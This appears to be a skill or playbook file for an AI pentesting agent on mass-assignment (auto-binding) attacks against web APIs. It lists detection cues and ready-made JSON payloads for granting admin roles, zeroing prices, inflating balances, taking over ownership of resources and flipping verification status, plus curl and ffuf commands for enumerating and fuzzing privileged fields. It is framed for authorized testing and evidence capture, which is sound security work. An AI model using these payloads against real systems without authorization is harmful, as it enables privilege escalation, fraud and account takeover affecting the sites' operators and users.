---
name: mass-assignment
description: Mass assignment / auto-binding exploitation — extra JSON/query fields get bound to internal model attributes, enabling privilege escalation, price changes, role changes. Use when an API accepts JSON objects and returns the full object after save.
category: authn-authz
---

# Mass Assignment (Auto-Binding)

## Detection
- API accepts `{"name":"x","role":"user"}` and echoes the full persisted object including fields you never sent.
- Response reveals hidden columns: `isAdmin`, `role`, `status`, `balance`, `createdBy`, `ownerId`, `approved`.
- Compare response object keys vs the input keys — any extra returned field is a binding candidate.

## Exploitation
1. **Role escalation**: send `{"role":"admin"}` or `{"isAdmin":true}` on update/create.
2. **Price/balance tampering**: `{"price":0}`, `{"balance":999999}`, `{"discount":100}`.
3. **Ownership takeover**: `{"ownerId":"<victim-id>"}` to move resource into attacker account, or `{"createdBy":"<attacker>"}`.
4. **Approval/status flip**: `{"status":"approved"}`, `{"verified":true}`, `{"emailVerified":true}`.
5. **BFLA combo**: mass-assign `adminId` on multi-tenant objects.

## Payloads
```
{"name":"x","role":"admin"}
{"name":"x","isAdmin":true,"isVerified":true}
{"price":0.01,"discount":100}
{"ownerId":1,"userId":1}
{"status":"active","banned":false}
{"settings":{"isPremium":true}}
```

## Tool Commands (Windows)
```powershell
# enumerate response keys vs input keys
curl.exe -s -X POST "$U/api/objects" -d '{"name":"test"}' -H 'Content-Type: application/json' | ConvertFrom-Json | Get-Member -MemberType NoteProperty
# fuzz likely privileged params against PATCH endpoint (requires ffuf)
# ffuf -w params.txt -u "$U/api/objects/ID" -X PATCH -d 'FUZZ=value' -H 'Content-Type: application/json' -H 'Cookie: sess=...' -fc 200
```

## Verification & Evidence
- Proof = persisted server-side change (re-fetch object, confirm altered role/price/owner).
- Capture request.txt (must show injected field), response.txt (shows persisted change), reproduce.ps1.